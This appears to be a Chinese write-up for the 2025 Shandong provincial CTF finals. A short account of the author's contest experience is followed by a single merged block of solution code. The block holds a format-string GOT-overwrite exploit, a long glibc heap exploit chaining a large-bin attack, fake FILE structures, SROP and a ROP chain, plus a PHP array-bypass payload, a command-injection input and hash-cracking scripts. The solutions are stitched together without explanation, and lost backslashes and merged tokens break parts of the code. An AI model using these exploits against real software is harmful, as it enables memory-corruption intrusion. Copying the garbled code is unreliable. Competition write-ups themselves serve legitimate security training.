# 2025鹏云杯山东省第十二届网络安全技能大赛总决赛题解-WriteUp（山东省网络安全竞赛的净土）

> 原文: https://www.ctfiot.com/275628.html
> ID: 275628

前言

题目附件

欢迎关注公众号【Real返璞归真】回复【山东省赛】获取题目附件下载地址。

参赛体验

声明：以下均为客观事实，没有任何主观意愿，所描述的事实均有屏幕录制和前置摄像头采集视频资料。本人没有携带和使用任何违禁工具（包括但不限于U盘、手机等设备），没有违反任何比赛规则。全程只有11点左右做完理论题后点去过一次厕所。

自从省赛回来后，开始喜欢使用括号（）风格写文章。

首先，恭喜齐鲁工业大学（）（山东省科学院）（）（）（）的师傅们今年取得优异的成绩：
image-20251028225320940

收获团队冠军和亚军，且学生个人奖项前6名中有5名选手来自该校。前无古人，后无来者，堪称省内网安竞赛的奇迹。

今年参赛体验比较有趣，在（）齐鲁工业大学大学（）（山东省科学院）（）举办，还贴心的为我们配备了保镖。

今年的住宿是三人间，食宿比较节俭，场地离学校较远，没有空调，比去年曲阜师范大学的体育馆小了一点，座位布局比较紧凑（随便瞟一眼都能看到隔壁人的屏幕）。

中途还发生了一些小插曲：

中午12点左右突然来了两名（）大学的志愿者开始翻查我桌子上的信封，试图想找到什么东西，最后不了了之。

过了一会，又来了（）大学的两名志愿者，志愿者A：“那个USB插得什么”，志愿者B：“那不是键盘吗”，我：“？？这不就是有线键盘吗？”。

吃过午饭后，我的周围又多了一些“保镖”，大概聚集了4、5个人，每次我回头看总有个（）大学的志愿者一直盯着我的屏幕，可能是想学习CTF？

邻近比赛结束的时候，很多爱好者的志愿者都跑去围在几个高校选手的周围，到底在害怕什么？


```
python truecrypt2john.py ../../SecDisk > secdisk.hash
import uuid
import hashlib

flag = "flag{XXX}"

def abcduuid(flag):

    for char in flag:
        md5_hash = hashlib.md5(char.encode('utf-8')).hexdigest()
        print(f"{md5_hash}")

if __name__ == "__main__":
    abcduuid(flag)

'''output:
8fa14cdd754f91cc6554c9e71929cce7
2db95e8e1a9267b7a1188556b2013b33
0cc175b9c0f1b6a831c399e269772661
b2f5ff47436671b6e533d8dc3614845d
f95b70fdc3088560732a5ac135644506
e4da3b7fbbce2345d7772b0674a318d5
c4ca4238a0b923820dcc509a6f75849b
e1671797c52e15f763380b45e841ec32
c4ca4238a0b923820dcc509a6f75849b
eccbc87e4b5ce2fe28308fd9f2a7baf3
4a8a08f09d37b73795649038408b5f33
cfcd208495d565ef66e7dff9f98764da
e1671797c52e15f763380b45e841ec32
c81e728d9d4c2f636f067f89cc14862c
c4ca4238a0b923820dcc509a6f75849b
c4ca4238a0b923820dcc509a6f75849b
8f14e45fceea167a5a36dedd4bea2543
c81e728d9d4c2f636f067f89cc14862c
0cc175b9c0f1b6a831c399e269772661
8277e0910d750195b448797616e091ad
8fa14cdd754f91cc6554c9e71929cce7
c4ca4238a0b923820dcc509a6f75849b
c9f0f895fb98ab9159f51fd0297e236d
c9f0f895fb98ab9159f51fd0297e236d
eccbc87e4b5ce2fe28308fd9f2a7baf3
92eb5ffee6ae2fec3ad71c777531578f
e4da3b7fbbce2345d7772b0674a318d5
c4ca4238a0b923820dcc509a6f75849b
e4da3b7fbbce2345d7772b0674a318d5
8fa14cdd754f91cc6554c9e71929cce7
e4da3b7fbbce2345d7772b0674a318d5
c81e728d9d4c2f636f067f89cc14862c
0cc175b9c0f1b6a831c399e269772661
8fa14cdd754f91cc6554c9e71929cce7
92eb5ffee6ae2fec3ad71c777531578f
c9f0f895fb98ab9159f51fd0297e236d
cfcd208495d565ef66e7dff9f98764da
cbb184dd8e05c9709e5dcaedaa0495cf
'''
import hashlib

output = '''8fa14cdd754f91cc6554c9e71929cce7
2db95e8e1a9267b7a1188556b2013b33
0cc175b9c0f1b6a831c399e269772661
b2f5ff47436671b6e533d8dc3614845d
f95b70fdc3088560732a5ac135644506
e4da3b7fbbce2345d7772b0674a318d5
c4ca4238a0b923820dcc509a6f75849b
e1671797c52e15f763380b45e841ec32
c4ca4238a0b923820dcc509a6f75849b
eccbc87e4b5ce2fe28308fd9f2a7baf3
4a8a08f09d37b73795649038408b5f33
cfcd208495d565ef66e7dff9f98764da
e1671797c52e15f763380b45e841ec32
c81e728d9d4c2f636f067f89cc14862c
c4ca4238a0b923820dcc509a6f75849b
c4ca4238a0b923820dcc509a6f75849b
8f14e45fceea167a5a36dedd4bea2543
c81e728d9d4c2f636f067f89cc14862c
0cc175b9c0f1b6a831c399e269772661
8277e0910d750195b448797616e091ad
8fa14cdd754f91cc6554c9e71929cce7
c4ca4238a0b923820dcc509a6f75849b
c9f0f895fb98ab9159f51fd0297e236d
c9f0f895fb98ab9159f51fd0297e236d
eccbc87e4b5ce2fe28308fd9f2a7baf3
92eb5ffee6ae2fec3ad71c777531578f
e4da3b7fbbce2345d7772b0674a318d5
c4ca4238a0b923820dcc509a6f75849b
e4da3b7fbbce2345d7772b0674a318d5
8fa14cdd754f91cc6554c9e71929cce7
e4da3b7fbbce2345d7772b0674a318d5
c81e728d9d4c2f636f067f89cc14862c
0cc175b9c0f1b6a831c399e269772661
8fa14cdd754f91cc6554c9e71929cce7
92eb5ffee6ae2fec3ad71c777531578f
c9f0f895fb98ab9159f51fd0297e236d
cfcd208495d565ef66e7dff9f98764da
cbb184dd8e05c9709e5dcaedaa0495cf'''
output = output.split('n')

dic = {}
chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.~{}'
for x in chars:
    md5_hash = hashlib.md5(x.encode('utf-8')).hexdigest()
    dic[md5_hash] = x
print(dic)

for x in output:
    print(dic.get(x), end='')
    
# {'7fc56270e7a70fa81a5935b72eacbe29': 'A', '9d5ed678fe57bcca610140957afab571': 'B', '0d61f8370cad1d412f80b84d143e1257': 'C', 'f623e75af30e62bbd73d6df5b50bb7b5': 'D', '3a3ea00cfc35332cedf6e5e9a32e94da': 'E', '800618943025315f869e4e1f09471012': 'F', 'dfcf28d0734569a6a693bc8194de62bf': 'G', 'c1d9f50f86825a1a2302ec2449c17196': 'H', 'dd7536794b63bf90eccfd37f9b147d7f': 'I', 'ff44570aca8241914870afbc310cdb85': 'J', 'a5f3c6a11b03839d46af9fb43c97c188': 'K', 'd20caec3b48a1eef164cb4ca81ba2587': 'L', '69691c7bdcc3ce6d5d8a1361f22d04ac': 'M', '8d9c307cb7f3c4a32822a51922d1ceaa': 'N', 'f186217753c37b9b9f958d906208506e': 'O', '44c29edb103a2872f519ad0c9a0fdaaa': 'P', 'f09564c9ca56850d4cd6b3319e541aee': 'Q', 'e1e1d3d40573127e9ee0480caf1283d6': 'R', '5dbc98dcc983a70728bd082d1a47546e': 'S', 'b9ece18c950afbfa6b0fdbfa4ff731d3': 'T', '4c614360da93c0a041b22e537de151eb': 'U', '5206560a306a2e085a437fd258eb57ce': 'V', '61e9c06ea9a85a5088a499df6458d276': 'W', '02129bb861061d1a052c592e2dc6b383': 'X', '57cec4137b614c87cb4e24a3d003a3e0': 'Y', '21c2e59531c8710156d34a3c30ac81d5': 'Z', '0cc175b9c0f1b6a831c399e269772661': 'a', '92eb5ffee6ae2fec3ad71c777531578f': 'b', '4a8a08f09d37b73795649038408b5f33': 'c', '8277e0910d750195b448797616e091ad': 'd', 'e1671797c52e15f763380b45e841ec32': 'e', '8fa14cdd754f91cc6554c9e71929cce7': 'f', 'b2f5ff47436671b6e533d8dc3614845d': 'g', '2510c39011c5be704182423e3a695e91': 'h', '865c0c0b4ab0e063e5caa3387c1a8741': 'i', '363b122c528f54df4a0446b6bab05515': 'j', '8ce4b16b22b58894aa86c421e8759df3': 'k', '2db95e8e1a9267b7a1188556b2013b33': 'l', '6f8f57715090da2632453988d9a1501b': 'm', '7b8b965ad4bca0e41ab51de7b31363a1': 'n', 'd95679752134a2d9eb61dbd7b91c4bcc': 'o', '83878c91171338902e0fe0fb97a8c47a': 'p', '7694f4a66316e53c8cdd9d9954bd611d': 'q', '4b43b0aee35624cd95b910189b3dc231': 'r', '03c7c0ace395d80182db07ae2c30f034': 's', 'e358efa489f58062f10dd7316b65649e': 't', '7b774effe4a349c6dd82ad4f4f21d34c': 'u', '9e3669d19b675bd57058fd4664205d2a': 'v', 'f1290186a5d0b1ceab27f4e77c0c5d68': 'w', '9dd4e461268c8034f5c8564e155c67a6': 'x', '415290769594460e2e485922904f345d': 'y', 'fbade9e36a3f36d3d676c1b808451dd7': 'z', 'cfcd208495d565ef66e7dff9f98764da': '0', 'c4ca4238a0b923820dcc509a6f75849b': '1', 'c81e728d9d4c2f636f067f89cc14862c': '2', 'eccbc87e4b5ce2fe28308fd9f2a7baf3': '3', 'a87ff679a2f3e71d9181a67b7542122c': '4', 'e4da3b7fbbce2345d7772b0674a318d5': '5', '1679091c5a880faf6fb5e6087eb1b2dc': '6', '8f14e45fceea167a5a36dedd4bea2543': '7', 'c9f0f895fb98ab9159f51fd0297e236d': '8', '45c48cce2e2d7fbdea1afc51c7c6ad26': '9', '336d5ebc5436534e61d16e63ddfca327': '-', 'b14a7b8059d9c055954c92674ce60032': '_', '5058f1af8388633f609cadb75a75dc9d': '.', '4c761f170e016836ff84498202b99827': '~', 'f95b70fdc3088560732a5ac135644506': '{', 'cbb184dd8e05c9709e5dcaedaa0495cf': '}'}

# flag{51e13c0e21172adf1883b515f52afb80}
?a[]=123&b[]=456
nl *
from pwn import *
import ctypes

context(arch='amd64', os='linux')
context.log_level = 'debug'

p = process('./printf')
elf = ELF('./printf')
libc = ELF('libc.so.6')
libcc = ctypes.CDLL('./libc.so.6')

setvbuf = 0x404038
system = 0x4010B0
stdin = 0x404070
payload = fmtstr_payload(8, {setvbuf:
system, stdin:
0x404100, 0x404100:
0x68732f6e69622f, 0x404018:
0x4011F5})

p.sendline(payload)

p.interactive()
from pwn import *
import ctypes

context(arch='amd64', os='linux')
context.log_level = 'debug'

p = process('./pwn')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

def add_chunk(index, size):
    p.sendlineafter(b">>", b"1")
    p.sendlineafter(b"index:", str(index).encode())
    p.sendlineafter(b"size:", str(size).encode())

def delete_chunk(index):
    p.sendlineafter(b">>", b"2")
    p.sendlineafter(b"index:", str(index).encode())

def show_chunk(index):
    p.sendlineafter(b">>", b"3")
    p.sendlineafter(b"index:", str(index).encode())

def edit_chunk(index, content):
    p.sendlineafter(b">>", b"4")
    p.sendlineafter(b"index:", str(index).encode())
    sleep(1)
    p.send(content)

def uaf_delete(index):
    p.sendlineafter(b">>", b"10086")
    p.sendlineafter(b"index:", str(index).encode())

add_chunk(0, 0x418)
add_chunk(1, 0x488)
add_chunk(2, 0x428)
add_chunk(3, 0x488)
add_chunk(4, 0x418)
add_chunk(5, 0x488)

# 1.leak libc
delete_chunk(0)

add_chunk(0, 0x418)
show_chunk(0)
libc_base = u64(p.recv(6).ljust(8, b'x00')) - 0x1cbce0 - 0x6000
libc.address = libc_base
success('libc_base = ' + hex(libc_base))

# 2.leak heap
delete_chunk(4)
uaf_delete(2)
delete_chunk(0)

show_chunk(2)
heap_base = u64(p.recv(6).ljust(8, b'x00')) & ~0xFFF - 0x1000
success('heap_base = ' + hex(heap_base))

add_chunk(4, 0x418)

# 3.large bin attack
add_chunk(0, 0x418)

edit_chunk(2, p64(0) * 3 + p64(libc.sym['_IO_list_all'] - 0x20))
delete_chunk(0)
add_chunk(0, 0x408)
edit_chunk(2, p64(libc.sym['main_arena'] + 1104) * 2 + p64(heap_base + 0x6d0) * 2)
add_chunk(2, 0x428)

file_addr = heap_base + 0x6d0
payload_addr = file_addr + 0x10
frame_addr = file_addr + 0x168
rop_addr = frame_addr + 0xf8
buf_addr = rop_addr + 0x60

obstack_addr = file_addr + 0x110
ch_1_addr = obstack_addr + 8 + 1
fake_file = b""
fake_file += p64(1)  # _IO_read_end
fake_file += p64(0)  # _IO_read_base
fake_file += p64(0)  # _IO_write_base
fake_file += p64(ch_1_addr)  # _IO_write_ptr
fake_file += p64(ch_1_addr)  # _IO_write_end
fake_file += p64(0)  # _IO_buf_base;
fake_file += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_file += p64(0) * 4
# from _IO_save_base to _markers
fake_file += p64(0)  # the FILE chain ptr
fake_file += p32(2)  # _fileno for stderr is 2
fake_file += p32(0)  # _flags2, usually 0
fake_file += p64(frame_addr)  # _old_offset, -1
fake_file += p16(1)  # _cur_column
fake_file += b"x00"# _vtable_offset
fake_file += b"n"# _shortbuf[1]
fake_file += p32(0)  # padding
fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0)  # _IO_stdfile_1_lock
fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_file += p64(0)  # _codecvt, usually 0
fake_file += p64(file_addr + 0x10)  # _IO_wide_data_1
fake_file += p64(0) * 3
# from _freeres_list to __pad5
fake_file += p32(0xFFFFFFFF)  # _mode, usually -1
fake_file += b"x00" * 19
# _unused2
fake_file = fake_file.ljust(0xD8 - 0x10, b'x00')  # adjust to vtable
fake_file += p64(libc.address + 0x1d2ae0)  # fake vtable
fake_file += p64(file_addr + 0xe8)  # next
fake_file += p64(0)  # write_base
fake_file += p64(0)  # write_ptr
fake_file += p64(ch_1_addr)  # write_end
fake_file += p64(0)  # written
fake_file += p64(11)  # mode
fake_file += p64(obstack_addr)  # obstack
fake_file += p64(0) * 6
fake_file += p64(next(libc.search(asm('mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20];'),
                             executable=True)))  # chunkfun
fake_file += p64(0)  # freefun
fake_file += p64(frame_addr)  # extra_arg
fake_file += p8(1)  # use_extra_arg

frame = SigreturnFrame()
frame.rdi = buf_addr
frame.rsi = 0
frame.rsp = rop_addr
frame.rip = libc.sym['open']

frame = bytearray(bytes(frame))
frame[8:8 + 8] = p64(frame_addr)
frame[0x20:
0x20 + 8] = p64(libc.sym['setcontext'] + 61)
frame = bytes(frame)

rop = b''
rop += p64(next(libc.search(asm('pop rdi; ret;'), executable=True)))
rop += p64(3)
rop += p64(next(libc.search(asm('pop rsi; ret;'), executable=True)))
rop += p64(buf_addr)
rop += p64(next(libc.search(asm('pop rdx; pop r12; ret;'), executable=True)))
rop += p64(0x100)
rop += p64(0)
rop += p64(libc.sym['read'])
rop += p64(next(libc.search(asm('pop rdi; ret;'), executable=True)))
rop += p64(buf_addr)
rop += p64(libc.sym['puts'])

payload = b''
payload += fake_file
assert len(payload) <= frame_addr - payload_addr
payload = payload.ljust(frame_addr - payload_addr, b'x00')
payload += frame
assert len(payload) <= rop_addr - payload_addr
payload = payload.ljust(rop_addr - payload_addr, b'x00')
payload += rop
assert len(payload) <= buf_addr - payload_addr
payload = payload.ljust(buf_addr - payload_addr, b'x00')
payload += b'./flagx00'
assert len(payload) <= 0x428

edit_chunk(2, payload)

# gdb.attach(p, "b __printf_buffer_as_file_overflownc")
# pause()

gdb.attach(p, 'b _IO_flush_all_lockpnc')
pause()

p.sendlineafter(b">>", b"5")

p.interactive()
python pyinstxtractor.py re1
pycdc/pycdc src.pyc
# Source Generated with Decompyle++
# File: src.pyc (Python 3.10)

import hashlib

def get_user_input():
    user_input = input('请输入: ').strip()
    if len(user_input) != 9:
        print('你的输入存在错误！')
        continue
    ifnot user_input.isdigit():
        print('你的输入存在错误！')
        continue
    return user_input

def check_md5_match(user_input, target_hash):
    input_md5 = hashlib.md5(user_input.encode()).hexdigest()
    if input_md5 == target_hash:
        returnTrue

def main():
    TARGET_HASH = 'b4bb721a74f07177a6dbc3e113c327e3'
    user_input = get_user_input()
    is_match = check_md5_match(user_input, TARGET_HASH)
    if is_match:
        flag = "flag{md5(user_input + 'SDnisc')}"
        print('验证成功！')
        print(f'''Flag: {flag}''')
        returnNone
    None('验证失败！')

if __name__ == '__main__':
    main()
    returnNone
hashcat -a 3 -m 0 b4bb721a74f07177a6dbc3e113c327e3 ?d?d?d?d?d?d?d?d?d
enc = [0xB4, 0xB6, 0x9F, 0xA1, 0xC5, 0xAD, 0x7A, 0x68, 0x77, 0xAD, 0x7B, 0x70, 0x1D, 0x68, 0x70, 0x7B, 0x76, 0x70, 0xA0, 0x7C, 0x1D, 0xAE, 0x7B, 0x77, 0xB4, 0x7C, 0xAE, 0xB4, 0x68, 0xA0, 0x68, 0xF9, 0x76, 0xB3, 0x70, 0x77, 0x9F, 0xBA]
key = [3, 5, 1, 6, 2, 4, 5, 6, 3, 1, 2, 5, 4, 6, 1, 3, 2, 5, 4, 6, 1, 3, 2, 5, 4, 6, 1, 3, 5, 2, 4, 6, 1, 3, 2, 5, 4, 6, 1, 3]
enc = [0xB4, 0xB6, 0x9F, 0xA1, 0xC5, 0xAD, 0x7A, 0x68, 0x77, 0xAD, 0x7B, 0x70, 0x1D, 0x68, 0x70, 0x7B, 0x76, 0x70, 0xA0, 0x7C, 0x1D, 0xAE, 0x7B, 0x77, 0xB4, 0x7C, 0xAE, 0xB4, 0x68, 0xA0, 0x68, 0xF9, 0x76, 0xB3, 0x70, 0x77, 0x9F, 0xBA]
key = [3, 5, 1, 6, 2, 4, 5, 6, 3, 1, 2, 5, 4, 6, 1, 3, 2, 5, 4, 6, 1, 3, 2, 5, 4, 6, 1, 3, 5, 2, 4, 6, 1, 3, 2, 5, 4, 6, 1, 3]

def rotate_right(b: int, shift: int) -> int:
    shift &= 7
    b &= 0xFF
    return ((b >> shift) | (b << (8 - shift))) & 0xFF

def rotate_left(b: int, shift: int) -> int:
    shift &= 7
    b &= 0xFF
    return ((b << shift) | (b >> (8 - shift))) & 0xFF

def change(op, x):
    if op == 1:
        return x ^ 5
    elif op == 2:
        return x - 1
    elif op == 3:
        return x + 1
    elif op == 4:
        x += 1
        x = rotate_left(x, 2) + 2
        x = rotate_right(x, 2) - 3
        return x
    elif op == 5:
        return rotate_right(x, 1)
    elif op == 6:
        return rotate_left(x, 1)

for x in enc:
    tmp = x
    for j in range(39, -1, -1):
        tmp = change(key[j], tmp)
    if tmp != 0:
        print(chr(tmp), end='')

# flag{c603c78508728b45d73f4df0b012e83a}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1761707440-wxsync-2025-10-5c9ca443fde030c79d29ee3831b72900.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1761707441-wxsync-2025-10-ae47bf8d7f2cec9eb91cf030321b8908.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1761707443-wxsync-2025-10-9fc279fd0ebcdba194f2ebfc10149739.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1761707445-wxsync-2025-10-f2ba3e74c8e6f34c3960117b9faddf1d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1761707447-wxsync-2025-10-ee40a86be155ddb92300fd4e0e386df6.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1761707449-wxsync-2025-10-8a91a2527b5a8b202ef1ceacad374315.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1761707451-wxsync-2025-10-8ab802e58af2923620495246b7b42e46.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1761707452-wxsync-2025-10-71702a305d19668950f09d37f0637ec6.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1761707454-wxsync-2025-10-71f806565599e983f73cfac79d0edf7a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/10/1761707456-wxsync-2025-10-c15b7bc442107ee9506ba445d929383b.png)